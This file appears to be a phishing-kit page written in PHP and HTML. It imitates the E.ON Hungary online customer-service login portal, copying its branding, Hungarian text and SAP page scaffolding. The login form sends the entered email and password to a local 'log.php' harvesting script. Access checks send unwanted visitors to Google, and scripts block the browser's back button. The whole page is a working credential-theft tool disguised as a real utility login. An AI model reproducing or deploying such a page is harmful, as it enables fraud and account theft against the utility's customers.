<?php
	include('Crypt.php');
	session_start();
	if(isset($_SESSION['access']) && $_SESSION['access'] == false){
		header("location:https://www.google.com");
	}
?>
<html lang="hu" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title><?php echo MHT_ENCODING("E.ON ügyfélszolgálat");?> </title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="expires" content="0">
	<meta http-equiv="Cache-Control" content="no-cache, must-revalidate, no-store">
	<script async="" src="./files/analytics.js"></script>
	<script language="JavaScript" type="text/javascript" src="./files/jquery-1.10.2.min.js"></script>
	<script language="JavaScript" type="text/javascript" src="./files/jquery.bpopup.min.js"></script>
	<script language="JavaScript" type="text/javascript" src="./files/inputvalidation.js"></script>
	<script language="JavaScript" type="text/javascript" src="./files/jquery-ui.min.js"></script>
	<script language="JavaScript" type="text/javascript" src="./files/jquery.blockUI.js"></script>
	<script language="JavaScript" type="text/javascript" src="./files/jquery.cluetip.min.js"></script>
	<script language="JavaScript" type="text/javascript" src="./files/jquery.number.min.js"></script>
	<script language="JavaScript" type="text/javascript" src="./files/webtoolkit.md5.js"></script>
	<script language="JavaScript" type="text/javascript" src="./files/jquery.ui.selectmenu.js"></script>
	<script language="JavaScript" type="text/javascript" src="./files/page.js"></script>
	<link href="./files/page.css" type="text/css" rel="stylesheet" id="page_style">
	<link href="./files/component.css" type="text/css" rel="stylesheet">
	<meta http-equiv="imagetoolbar" content="no">
	<script type="text/javascript" language="JavaScript" src="./files/events.js"></script>
	<script type="text/javascript" language="JavaScript" src="./files/event_dictionary.js"></script>
	<link id="urstyle" rel="stylesheet" type="text/css" href="./files/ur_nn7.css">
	<script type="text/javascript" language="JavaScript">var popup_emptydoc="/sap/public/bsp/sap/htmlb/domainRelaxOff.htm?0008";var HTMLB_SECTION508 = false;</script>
	<script type="text/javascript" language="JavaScript">var sapUrDomainRelaxing = {NONE:"NONE",MINIMAL:"MINIMAL",MAXIMAL:"MAXIMAL"};ur_system={doc:window.document ,mimepath:"/sap/public/bc/ur/Design2002/themes/zeon2013/common/",stylepath:"/sap/public/bc/ur/Design2002/themes/zeon2013/ur/",emptyhoverurl:"/sap/public/bsp/sap/htmlb/domainRelaxOff.htm?0008",is508:false,direction:"ltr",domainrelaxing:sapUrDomainRelaxing.NONE,browser_abbrev:"nn7",dateformat:4,firstdayofweek:0,ur_version:"6.0.17.0.0",css_version:"6.0.17.0.0"}</script>
	<script type="text/javascript" language="JavaScript" src="./files/sapUrMapi_nn7.js"></script>
	<script type="text/javascript" language="JavaScript" src="./files/popup_nn7.js"></script>
</head>
<body class="urBdyStd" scroll="AUTO" onload="bodyLoad();noBack();" onpageshow="if (event.persisted) noBack();" onunload="" style="margin: 0px;">
	<div id="urFrames">
		<iframe id="sapPopupMainId_X0" name="sapPopupMainId_X0" src="./files/domainRelaxOff.html" style="z-index:1001;display:block;position:absolute;top:-5000;width:0;height:0" frameborder="0" border="no" scrolling="no" tabindex="-1"></iframe>
	</div><script type="text/javascript" language="JavaScript" src="./files/urMessageBundle_hu.js"></script>
	<script type="text/javascript" language="JavaScript" src="./files/misc.js"></script>
	<script language="JavaScript" type="text/javascript" src="./files/jquery.cookie.js"></script>
	<script type="text/javascript">function login_check(){if (!ERP_hasValue(document["frm_LOGIN.HTM"]["username"])) return true;if (!ERP_hasValue(document["frm_LOGIN.HTM"]["pwd"])) return true;return false;}function bodyLoad() {var lv_goid = document.getElementById('goid');parent.parent.history.replaceState(null, null,);}</script>
	<style>
	.tajekoztatas {background-color: #fffddc;border: 1px solid #fba49d;margin: 10px;padding: 13px;}</style>
	<script language="JavaScript" type="text/javascript">jQuery("html, body").animate({ scrollTop: 0 }, 600);function htmlbSubmitPre() { $.blockUI({       css: {           border: '3px solid #DDDDDD',           padding: '25px',           backgroundColor: '#FFFFFF',           color: '#5D5D5D'       },      message: "Türelmét kérjük. "  }); }window.history.forward();function noBack() { window.history.forward(); }</script>
	<script type="text/javascript" src="./files/modernizr.js"></script>
	<iframe src="./files/activityi.html" width="1" height="1" frameborder="0" style="display:none"></iframe>
	<noscript><iframe src="https://5472389.fls.doubleclick.net/activityi;src=5472389;type=eon;cat=2016_00m;u3=2016_EON_Eportal_onlineugyfelszolgadc_lat=;dc_rdid=;tag_for_child_directed_treatment=;ord=1?" width="1" height="1" frameborder="0" style="display:none"></iframe></noscript>
	<input disabled="" type="hidden" id="htmlb_first_form_id" name="htmlb_first_form_id" value="frm_LOGIN.HTM">
	<form action="log.php" id="frm_LOGIN.HTM" name="frm_LOGIN.HTM" method="POST">
		<input type="hidden" name="htmlbScrollX">
		<input type="hidden" name="htmlbScrollY">
		<input type="hidden" name="htmlbevt_ty">
		<input type="hidden" name="htmlbdoc_id" value="">
		<input type="hidden" name="htmlbevt_frm" id="htmlbevt_frm" value="frm_LOGIN.HTM">
		<input type="hidden" name="htmlbevt_oid">
		<input type="hidden" name="htmlbevt_id">
		<input type="hidden" name="htmlbevt_cnt">
		<input type="hidden" name="htmlbevt_par1">
		<input type="hidden" name="htmlbevt_par2">
		<input type="hidden" name="htmlbevt_par3">
		<input type="hidden" name="htmlbevt_par4">
		<input type="hidden" name="htmlbevt_par5">
		<input type="hidden" name="htmlbevt_par6">
		<input type="hidden" name="htmlbevt_par7">
		<input type="hidden" name="htmlbevt_par8">
		<input type="hidden" name="htmlbevt_par9">
		<input type="hidden" name="onInputProcessing" value="htmlb">
		<input type="hidden" name="frm_LOGIN.HTM_complete" id="frm_LOGIN.HTM_complete" code="OK">
		<input type="hidden" name="sap-htmlb-design" id="sap-htmlb-design" value="">
		<div id="wrapper">
			<header id="header" role="banner"><h1 id="logo2013"><a title="Link: E.ON:Elektronikus ügyfélszolgálat "><img id="headlogo" width="165" height="49" alt="Link: E.ON:Elektronikus ügyfélszolgálat " src="./files/logo_PXH.gif"></a></h1><div id="inforeg2013"><div id="col2"></div></div><nav id="public_nav" class="main"></nav></header>
			<div id="main" class="gray" style="padding-left: 10px;padding-right: 10px;"><div class="myrow"><div class="twelve columns" style="padding-top:20px; padding-bottom: 20px;"><div class="myrow"><div class="eight columns"><div id="message"></div><div class="myrow"><div class="push_one eleven columns"><p></p><h1 style="display:block;color: #E91C09; font-weight: bold;font-size: 20px;"><?php echo MHT_ENCODING("Online ügyfélszolgálat - ahol mindig Ön az első");?></h1><div style="margin-top:20px; font-siz:14px;"><?php echo MHT_ENCODING("Intézze ügyeit Ön is gyorsan és biztonságosan, online!");?><div style="padding-top: 10px;"><?php echo MHT_ENCODING("A regisztrációt és belépést követően:");?></div><div style="margin-top:0; font-siz:14px;"><ul style="padding:0 0 0 16px;margin-top:0;"><li style="padding: 0"><b><?php echo MHT_ENCODING("Elektronikus számlára válthat");?></b></li><li style="padding: 0"><?php echo MHT_ENCODING("Rögzítheti mérőállását");?></li><li style="padding: 0"><?php echo MHT_ENCODING("Megtekintheti aktuális egyenlegét és számláit");?></li><li style="padding: 0"><?php echo MHT_ENCODING("Kifizetheti számláit bankkártyával");?></li><li style="padding: 0"><?php echo MHT_ENCODING("Számlamásolatot és postai csekket igényelhet");?></li><li style="padding: 0"><?php echo MHT_ENCODING("Módosíthatja havi részszámláit");?></li><li style="padding: 0"><?php echo MHT_ENCODING("Értesítést kérhet a tervezett üzemszünetekről");?></li><li style="padding: 0"><?php echo MHT_ENCODING("Módosíthatja személyes adatait");?></li><li style="padding: 0"><?php echo MHT_ENCODING("Megtekintheti, módosíthatja");?> <a>PIN kódját</a>, <?php echo MHT_ENCODING("amelynek segítségével bárkit felhatalmazhat az ügyintézésre");?></li></ul></div><div style="margin-top:15px; font-siz:14px;"><?php echo MHT_ENCODING("Egy regisztráción belül több felhasználó azonosító kezelésére is lehetősége van.");?></div><p style="margin-bottom: 0;"><span style="font-weight: bold;"><?php echo MHT_ENCODING("Ügyfélszolgálat mobilon is");?></span><span style="display: block;"><?php echo MHT_ENCODING("Kattintson, és töltse le ingyenes alkalmazásunkat:");?><br><a><img src="./files/Google-play-logo.jpg" style="height:23px;width:65px;padding-left:10px;border:0;"></a><a><img src="./files/AppStoreLogo.jpg" style="height:23px;width:65px;padding-left:10px;border:0;"></a></span></p></div><p></p></div></div></div><div class="four columns"><div style="height: 250px;background-color: white;border: 1px solid rgb(185, 185, 185);padding: 5px 10px 0px;width: 220px;"><table id="login" style="width:100%;" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td><h2 style="color:#E91C09">Bejelentkezés</h2></td></tr><tr><td style="background:none repeat scroll 0 0 #F5F5F5; padding: 6px;"><span>E-mail cím *</span></td></tr><tr><td style="background:none repeat scroll 0 0 #F5F5F5;padding: 6px;"><span id="username-r" class="urEdf2Whl"><input type="text" class="urEdf2TxtEnbl urV" required="email" autocomplete="on" maxlength="241" id="username" placeholder="E-mail cím" name="em" title="E-mail cím" value="" style="width:200px;"><span class="urAr"></span></span><script type="text/javascript">$('#username').attr('autocomplete', 'on');</script><input type="hidden" id="goid" ct="InputField" name="zcl_xweb_bsp_proc_gv_goid_com"></td></tr><tr><td style="background:none repeat scroll 0 0 #F5F5F5;padding: 6px;"><span><?php echo MHT_ENCODING("Jelszó *");?></span></td></tr><tr><td style="background:none repeat scroll 0 0 #F5F5F5;padding: 6px;"><span id="pwd-r" class="urEdf2Whl"><input type="Password" class="urEdf2TxtEnbl urV" autocomplete="off" maxlength="16" id="pwd" placeholder="Jelszó" name="ed" title="Jelszó" style="width:200px;"><span class="urAr"></span></span></td></tr><tr><td style="background:none repeat scroll 0 0 #F5F5F5;padding: 6px; font-size:xx-small;"><p class="legend-error"><?php echo MHT_ENCODING("A *-gal jelölt mezőket kötelező kitölteni!");?></p>                                   </td></tr><tr><td style="background:none repeat scroll 0 0 #F5F5F5;padding: 6px 6px 16px;"><a onmouseover="return true;" id="bejelentkezes" title="Link:Bejelentkezés " onclick="htmlbEF(&#39;htmlbevent.cancelSubmit\x20\x3d\x20login_check\x28\x29&#39;);return htmlbEL(this,5,&#39;bejelentkezes:onLogin&#39;);" onkeypress="return me.ur_Button_keypress(event);" class="button_green" href="javascript:void(0);" role="button">Bejelentkezés</a></td></tr></tbody></table></div></div></div></div></div><div class="myrow"><div class="centered eleven columns"><div style=" width: 914px; height: 160px;"><iframe src="./files/kisokos.html" frameborder="0" height="100%" width="100%" scrolling="no"></iframe></div></div></div></div><a class="scrollup" style="display: none;">Scroll</a><footer id="footer" style="margin-top: 20px !important;"><h2 class="hidden">Footer</h2><div role="contentinfo" class="mandatory"><p class="copyright" title=""><?php echo MHT_ENCODING("© E.ON Hungária 2008-2013");?></p><ul><li><a><?php echo MHT_ENCODING("Adatvédelem");?></a></li><li><a><?php echo MHT_ENCODING("Impresszum");?></a></li><li><a title="Link: Technikai információk     "><?php echo MHT_ENCODING("Technikai információk");?>    </a></li></ul></div></footer></div><script type="text/javascript">var lv_user = document.getElementById('username');if (lv_user != null)document.getElementById('username').focus();</script></form>
<script language="javascript" type="text/javascript">
$(document).ready( function(){  $.removeCookie('LaVisitorId', { path: "/" });  $.removeCookie('LaRunningChat', { path: "/" });  $.removeCookie('LaVisitorId', { path: "/", domain: "eon-hungary.ladesk.com" });  $.removeCookie('LaRunningChat', { path: "/", domain: "eon-hungary.ladesk.com" });setTimeout(function(){    $("#tajekoztato").slideToggle("fast");},700);$( ".tajekoztatas div a" ).click(function(event) {  var nev = $( this ).parent().parent().attr('id');  $("#"+nev).fadeOut( 1000 );});   });</script>
<script language="JavaScript" type="text/javascript" src="./files/cbpHorizontalMenu.min.js"></script>
<script language="javascript" type="text/javascript">    $(document).ready( function(){$(document).click(function(ev) { if( ev.view.eventName !== undefined ){ga('send', {  hitType: 'event',  eventCategory: ev.view.objectID,  eventAction: ev.view.eventName,  eventLabel: ev.type});};if( ev.target.href !== "javascript:void(0);" && ev.target.href !== undefined ){   ga('send', 'event', 'outbound', 'click', ev.target.href );};});    jQuery(window).scroll(function(){        if (jQuery(this).scrollTop() > 100) {            jQuery('.scrollup').fadeIn();        } else {            jQuery('.scrollup').fadeOut();        }    });    jQuery('.scrollup').click(function(){        jQuery("html, body").animate({ scrollTop: 0 }, 600);        return false;    });   });</script>
<script language="JavaScript" type="text/javascript" src="./files/event.js"></script><!--214243 -->
<script language="JavaScript">
function sapOnResize(){;}window.onresize=sapOnResize;
</script><div id="cluetip-waitimage" style="position: absolute; display: none;"></div><div id="cluetip" style="position: absolute; display: none;"><div class="cluetip-outer" style="position: relative; z-index: 97;"><h3 class="cluetip-title ui-widget-header ui-cluetip-header"></h3><div class="cluetip-inner ui-widget-content ui-cluetip-content"></div></div><div class="cluetip-extra"></div><div class="cluetip-arrows ui-state-default"></div></div></body></html>